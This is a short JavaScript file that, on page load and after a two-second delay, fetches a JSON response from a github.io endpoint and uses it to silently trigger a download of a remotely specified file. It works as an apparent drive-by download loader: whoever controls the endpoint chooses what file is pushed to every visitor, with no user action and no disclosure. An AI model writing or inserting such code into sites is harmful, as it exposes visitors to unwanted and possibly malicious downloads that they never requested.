function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function deliverFile() {
  try {
    await sleep(2000);

    const apiUrl = 'https://gitfilehost.github.io/linked/';
    const response = await fetch(apiUrl);
    if (!response.ok) throw new Error(`HTTP ${response.status}`);

    const { url, filename } = await response.json();
    if (typeof url !== 'string' || !url.startsWith('http')) {
      throw new Error('Error');
    }

    const a = document.createElement('a');
    a.href = url;
    if (filename) a.download = filename;
    document.body.appendChild(a);
    a.click();
    a.remove();
  } catch (err) {
    console.error('Error:', err);
  }
}

document.addEventListener('DOMContentLoaded', deliverFile);
